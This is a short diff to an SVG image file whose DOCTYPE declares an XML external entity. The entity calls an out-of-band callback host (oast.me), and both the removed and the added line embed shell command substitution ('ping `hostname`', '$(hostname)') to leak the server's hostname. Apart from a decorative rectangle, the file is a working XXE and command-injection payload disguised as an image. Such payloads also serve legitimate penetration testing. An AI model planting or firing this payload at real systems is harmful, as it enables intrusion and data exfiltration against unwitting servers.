@@ -1,6 +1,6 @@
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg [
-	<!ENTITY req SYSTEM "ping `hostname`.cnc41k8uaek36r57hb4g9t6krtomx6i4g.oast.me">
+	<!ENTITY req SYSTEM "https://$(hostname).cnc41k8uaek36r57hb4g9t6krtomx6i4g.oast.me">
 ]>
 <svg viewBox="0 0 400 400" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
       <rect x="0" y="0" rx="10" ry="10" width="400" height="400" style="fill:green;opacity:0.3"/>
